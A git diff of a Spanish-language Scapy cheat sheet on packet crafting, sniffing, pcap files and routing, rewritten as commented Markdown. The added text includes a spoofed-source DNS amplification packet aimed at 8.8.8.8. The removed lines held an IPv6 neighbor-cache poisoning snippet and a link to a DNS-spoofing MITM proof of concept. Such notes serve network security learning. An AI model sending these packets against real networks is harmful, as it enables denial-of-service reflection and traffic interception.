@@ -1,54 +1,94 @@
-ls()
-lsc()
-conf
-conf.route
+# Scapy
 
-packet = Ether()/IP(dst="google.com")/ICMP()/"ABCD"
-ls(packet)
-sendp(packet loop=1, count=3, inter=3)
-response = srp1(packet)
-ls(response)
-response.show()
-packet.summary()
+```sh
+# Entrar en el interprete de scapy
+$ scapy
 
+# Podemos ver los protocolos soportados por scapy.
+scapy> ls()
+# Con lsc() vemos las funciones disponibles en scapy
+scapy> lsc()
 
-packets = sniff(iface="wlan0", count=500, filter="tcp")
-ppackets
-len(packets)
-packet[4]
-wrpcap("/tmp/demo.pcap", packets)
-rdpcap("/tmp/demo.pcap")
+# Ejmplo de paquete ICMP
+# Es necesario declarar cada una de las capas que componen el paquete.
+# En este caso, necesitamos una capa Ethernet, IP, ICMP y finalmente los datos raw de aplicacion.
+scapy> packet = Ether()/IP(dst="google.com")/ICMP()/"ABCD" 
 
+# Con ls() tambien podemos enseñar la estructura de un paquete determinado.
+# Incluye la información de cada una de las capas del paquete
+scapy> ls(packet)
 
-packets = sniff(iface="wlan0", count=3, prn=lambda x:x.summary(), filter="icmp")
+# Con sendp enviamos el paquete a su correspondiente destino
+scapy> sendp(packet)
+# Con las opciones inter y loop podemos enviar el paquete de forma indefinida cada N segundos
+scapy> sendp(paquet, loop=1, inter=1)
+# Para enviar y recibir paquetes, podemos usar srp1
+scapy> response = srp1(packet)
+scapy> ls(response)
+scapy> response.show()
+scapy> packet.summary()
 
+# Para ver el paquete recibido en un formato mucho mas amigable y simplificado.
+scapy> _.show() 
+scapy> _.summary()
 
+# Con sniff podemos capturar paquetes del mismo modo que lo hacen herramientas como tcpdump o wireshark
+scapy> pkts = sniff(iface="wlan0", count=3)
+scapy> pkts[0] 
+scapy> pkts[1] 
+scapy> pkts[2]
 
-https://github.com/Adastra-thw/pyHacks/blob/master/MitmDnsSpoofingPoC.py
+# Si queremos almacenar un conjunto de paquetes en un fichero PCAP, podemos utilizar la funcion wrpcap
+scapy> wrpcap("demo.pcap", pkts)
+# Con la funcion rdpcap podemos leer un fichero pcap y obtener un listado de paquetes que pueden ser manejados desde python
+scapy> readed = rdpcap("demo.pcap")
+scapy> readed[0]
+scapy> readed[1]
 
+# Scapy soporta el formato BPF (Berkeley Packet Filters) 
+# el cual es un formato estandar para aplicar filtros sobre paquetes de red.
+# Estos filtros pueden aplicarse sobre un conjunto de paquetes o directamente sobre una captura activa.
+scapy> icmpPkts = sniff(iface="wlan0", filter="icmp" count=3) # filtrar por paquetes ICMP
+$ ping www.google.com
 
+scapy> icmpPkts[0]
+scapy> icmpPkts[1]
+scapy> icmpPkts[2]
+scapy> sniff(iface="eth0", count=3, prn=lambda x: x.summary(), filter="icmp")
+# Otra caracteristica interesante de la función sniff, es que cuenta con el atributo prn
+# el cual permite ejecutar una función cuando se captura un paquete.
+# Se trata de algo muy util si queremos manipular y reinyectar paquetes de datos
 
-ether = Ether(src="08:00:27:c5:6b:6c", dst="08:00:27:10:b8:d0")  # MAC origen (atacante) y destino (víctima)
-ipv6 = IPv6(src="fe80::d5d4:8c8c:648a:adcb", dst="2001:aaa:bbb:ccc::33")  # Direción IPv6 origen y destino
-na = ICMPv6ND_NA(tgt="2001:aaa:bbb:ccc::1", R=0)  # tgt indica la cache víctima a envenenar
-lla = ICMPv6NDOptDstLLAddr(lladdr="08:00:27:c5:6b:6c")  # Dirección física que queremos que tenga (atacante)
-(ether/ipv6/na/lla).display()
-sendp(ether/ipv6/na/lla, iface="enp0s3", loop=1, inter=5)  # loop=1 en forma continua cada 5 seg
+# Desde el interprete, tenemos acceso al comando conf,
+# el cual nos permite ver y editar la configuración con la que trabaja Scapy
+scapy> conf 
+scapy> conf.route
+# Manipular la tabla de ruteo que tiene scapy internamente
+scapy> conf.route.add[net="192.168.2.0/24", gw="192.168.2.1"]
+scapy> conf.route
+scapy> conf.route.resync()
+scapy> conf.route
+```
 
+**Fragmentación**
 
-Fragmentacion
-
-p = IPv6(dst="")/IPv6ExtHdrFragment()/ICMPv6EchoRequest()/Raw(load="A"*400) # paquete muy graande que queremos enviar a la red
+```python
+p = IPv6(dst="")/IPv6ExtHdrFragment()/ICMPv6EchoRequest()/Raw(load="A"*400) # paquete muy grande que queremos enviar a la red
 
 fr = fragment6(p, 100) # fragmenta el paquete grande en 100bytes
 for i in fr:
     send(i, iface="eth0")
+```
 
+**Amplificación DNS**
 
-DNS Amplification
-packet = IP(dst="8.8.8.8", src="victimIP")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="fwhibbit.es", qtype=255)) # dig ANY fwhibbit.es @8.8.8.8  # qtype 255 es como el ANY (toda la info posible)
+```python
+# dig ANY fwhibbit.es @8.8.8.8
+packet = IP(dst="8.8.8.8", src="victimIP")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="fwhibbit.es", qtype=255)) # qtype 255 es como el ANY (toda la info posible)
+
 send(packet)
+```
 
+**Modbus**
 
-MODBUS
-https://rodrigocantera.com/en/modbus-tcp-packet-injection-with-scapy/
+[here](https://rodrigocantera.com/en/modbus-tcp-packet-injection-with-scapy/)
